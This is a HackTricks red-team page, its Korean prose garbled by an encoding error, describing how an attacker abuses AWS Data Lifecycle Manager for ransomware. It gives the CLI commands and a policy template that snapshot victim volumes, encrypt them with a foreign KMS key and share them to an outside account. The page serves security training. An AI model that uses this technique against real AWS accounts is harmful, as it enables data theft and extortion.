# AWS - DLM Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Data Lifecycle Manger (DLM)

### `EC2:DescribeVolumes`, `DLM:CreateLifeCyclePolicy`

ëœì„¬ì›¨ì–´ ê³µê²©ì€ ê°€ëŠ¥í•œ ë§ì€ EBS ë³¼ë¥¨ì„ ì•”í˜¸í™”í•œ ë‹¤ìŒ í˜„ì¬ EC2 ì¸ìŠ¤í„´ìŠ¤, EBS ë³¼ë¥¨ ë° ìŠ¤ëƒ…ìƒ·ì„ ì‚­ì œí•˜ì—¬ ì‹¤í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì•…ì˜ì ì¸ í™œë™ì„ ìë™í™”í•˜ê¸° ìœ„í•´ Amazon DLMì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ AWS ê³„ì •ì˜ KMS í‚¤ë¡œ ìŠ¤ëƒ…ìƒ·ì„ ì•”í˜¸í™”í•˜ê³  ì•”í˜¸í™”ëœ ìŠ¤ëƒ…ìƒ·ì„ ë‹¤ë¥¸ ê³„ì •ìœ¼ë¡œ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜ëŠ” ì•”í˜¸í™”ë˜ì§€ ì•Šì€ ìŠ¤ëƒ…ìƒ·ì„ ê´€ë¦¬í•˜ëŠ” ê³„ì •ìœ¼ë¡œ ì „ì†¡í•œ ë‹¤ìŒ ê·¸ê³³ì—ì„œ ì•”í˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê¸°ì¡´ EBS ë³¼ë¥¨ì´ë‚˜ ìŠ¤ëƒ…ìƒ·ì„ ì§ì ‘ ì•”í˜¸í™”í•˜ëŠ” ê²ƒì€ ê°„ë‹¨í•˜ì§€ ì•Šì§€ë§Œ, ìƒˆ ë³¼ë¥¨ì´ë‚˜ ìŠ¤ëƒ…ìƒ·ì„ ìƒì„±í•˜ì—¬ ê·¸ë ‡ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë¨¼ì €, ì¸ìŠ¤í„´ìŠ¤ ID, ë³¼ë¥¨ ID, ì•”í˜¸í™” ìƒíƒœ, ì—°ê²° ìƒíƒœ ë° ë³¼ë¥¨ ìœ í˜•ê³¼ ê°™ì€ ë³¼ë¥¨ì— ëŒ€í•œ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ëŠ” ëª…ë ¹ì„ ì‚¬ìš©í•  ê²ƒì…ë‹ˆë‹¤.

`aws ec2 describe-volumes`

ë‘˜ì§¸, ë¼ì´í”„ì‚¬ì´í´ ì •ì±…ì„ ìƒì„±í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ DLM APIë¥¼ ì‚¬ìš©í•˜ì—¬ ì§€ì •ëœ ì‹œê°„ì— ì§€ì •ëœ ë³¼ë¥¨ì˜ ì¼ì¼ ìŠ¤ëƒ…ìƒ·ì„ ìë™ìœ¼ë¡œ ìƒì„±í•˜ëŠ” ë¼ì´í”„ì‚¬ì´í´ ì •ì±…ì„ ì„¤ì •í•©ë‹ˆë‹¤. ë˜í•œ ìŠ¤ëƒ…ìƒ·ì— íŠ¹ì • íƒœê·¸ë¥¼ ì ìš©í•˜ê³  ë³¼ë¥¨ì—ì„œ ìŠ¤ëƒ…ìƒ·ìœ¼ë¡œ íƒœê·¸ë¥¼ ë³µì‚¬í•©ë‹ˆë‹¤. policyDetails.json íŒŒì¼ì—ëŠ” ëŒ€ìƒ íƒœê·¸, ì¼ì •, ì•”í˜¸í™”ë¥¼ ìœ„í•œ ì„ íƒì  KMS í‚¤ì˜ ARN, ìŠ¤ëƒ…ìƒ· ê³µìœ ë¥¼ ìœ„í•œ ëŒ€ìƒ ê³„ì •ê³¼ ê°™ì€ ë¼ì´í”„ì‚¬ì´í´ ì •ì±…ì˜ ì„¸ë¶€ì •ë³´ê°€ í¬í•¨ë˜ì–´ ìˆìœ¼ë©°, ì´ëŠ” í”¼í•´ìì˜ CloudTrail ë¡œê·¸ì— ê¸°ë¡ë©ë‹ˆë‹¤.
```bash
aws dlm create-lifecycle-policy --description "My first policy" --state ENABLED --execution-role-arn arn:aws:iam::12345678910:role/AWSDataLifecycleManagerDefaultRole --policy-details file://policyDetails.json
```
ì •ì±… ë¬¸ì„œì˜ í…œí”Œë¦¿ì€ ì—¬ê¸°ì—ì„œ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
{
"PolicyType": "EBS_SNAPSHOT_MANAGEMENT",
"ResourceTypes": [
"VOLUME"
],
"TargetTags": [
{
"Key": "ExampleKey",
"Value": "ExampleValue"
}
],
"Schedules": [
{
"Name": "DailySnapshots",
"CopyTags": true,
"TagsToAdd": [
{
"Key": "SnapshotCreator",
"Value": "DLM"
}
],
"VariableTags": [
{
"Key": "CostCenter",
"Value": "Finance"
}
],
"CreateRule": {
"Interval": 24,
"IntervalUnit": "HOURS",
"Times": [
"03:00"
]
},
"RetainRule": {
"Count": 14
},
"FastRestoreRule": {
"Count": 2,
"Interval": 12,
"IntervalUnit": "HOURS"
},
"CrossRegionCopyRules": [
{
"TargetRegion": "us-west-2",
"Encrypted": true,
"CmkArn": "arn:aws:kms:us-west-2:123456789012:key/your-kms-key-id",
"CopyTags": true,
"RetainRule": {
"Interval": 1,
"IntervalUnit": "DAYS"
}
}
],
"ShareRules": [
{
"TargetAccounts": [
"123456789012"
],
"UnshareInterval": 30,
"UnshareIntervalUnit": "DAYS"
}
]
}
],
"Parameters": {
"ExcludeBootVolume": false
}
}
```
{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
